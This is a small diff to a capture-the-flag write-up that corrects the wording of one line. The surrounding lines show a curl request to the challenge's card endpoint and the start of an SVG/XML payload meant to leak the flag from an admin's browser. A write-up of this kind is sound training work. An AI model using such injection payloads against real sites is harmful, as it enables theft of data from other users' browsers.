@@ -18,7 +18,7 @@ curl 'https://hallmark.web.actf.co/card' -X POST \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   --data 'svg=text' --data 'content=<h1>1</h1>'
 ```
-- payload that will use to leak flag from within the admin browser
+- payload that will be used to leak the flag from within the admin browser
 ```xml
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
